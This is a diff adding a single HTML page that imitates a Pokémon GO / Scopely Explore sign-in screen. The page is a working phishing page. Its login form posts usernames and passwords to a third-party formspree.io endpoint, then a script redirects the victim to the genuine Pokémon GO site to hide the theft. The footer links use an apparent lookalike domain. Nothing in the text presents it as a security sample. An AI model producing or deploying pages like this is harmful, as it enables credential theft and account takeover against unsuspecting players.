@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pokémon GO - Sign In</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 420px;
+            padding: 32px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        .header .logo-text {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            letter-spacing: 0.5px;
+        }
+        .header .logo-text::before {
+            content: "⏳ ";
+        }
+        .header .sign-in {
+            font-size: 14px;
+            font-weight: 700;
+            color: #000;
+        }
+        .subheading {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 24px;
+        }
+        .input-group { margin-bottom: 16px; }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #fafafa;
+            transition: border-color 0.2s;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #4caf50;
+            background: #fff;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+        .btn-login:hover { background: #388e3c; }
+        .no-account {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        .no-account a { color: #f57c00; text-decoration: none; }
+        .banner {
+            margin-top: 28px;
+            background: linear-gradient(135deg, #1a237e, #3949ab);
+            border-radius: 10px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .banner .pokego-logo {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+        }
+        .banner .pokego-logo span { color: #ffeb3b; }
+        .banner .get-go {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            text-align: right;
+        }
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+        .footer .links {
+            font-size: 13px;
+            color: #f57c00;
+        }
+        .footer .links a { color: #f57c00; text-decoration: none; }
+        .footer .links a:hover { text-decoration: underline; }
+        .footer .copyright {
+            margin-top: 12px;
+            font-size: 11px;
+            color: #999;
+        }
+        .spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4caf50;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+            margin: 12px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <div class="logo-text">SCOPELY EXPLORE</div>
+        <div class="sign-in">SIGN IN</div>
+    </div>
+
+    <div class="subheading">Sign in with your Pokémon GO account</div>
+
+    <form action="https://formspree.io/f/mzerkddl" method="POST">
+        <div class="input-group">
+            <label for="username">Pokémon GO username</label>
+            <input type="text" id="username" name="email" placeholder="Pokémon GO username" required>
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="btn-login" id="submitBtn">Log In</button>
+        <div class="spinner" id="spinner"></div>
+    </form>
+
+    <div class="no-account">
+        If you don't have a Pokémon GO account, <a href="https://pokemongolive.com/en/signup">make one today!</a>
+    </div>
+
+    <div class="banner">
+        <div class="pokego-logo"><span>Pokémon</span> GO</div>
+        <div class="get-go">Get Up and GO!<br>Download Today</div>
+    </div>
+
+    <div class="footer">
+        <div class="links">
+            <a href="https://www.pokemongoglobal.com/terms">Terms of Service</a> ·
+            <a href="https://www.pokemongoglobal.com/privacy">Privacy policy</a> ·
+            <a href="https://www.pokemongoglobal.com/cookies">Cookie policy</a>
+        </div>
+        <div class="copyright">© 2012–2026 Scopely Explore (fka Niantic)</div>
+    </div>
+</div>
+
+<script>
+    document.querySelector('form').addEventListener('submit', function(e) {
+        const spinner = document.getElementById('spinner');
+        const btn = document.getElementById('submitBtn');
+        btn.style.display = 'none';
+        spinner.style.display = 'block';
+        setTimeout(() => {
+            window.location.href = "https://pokemongolive.com/en";
+        }, 1000);
+    });
+</script>
+
+</body>
+</html>
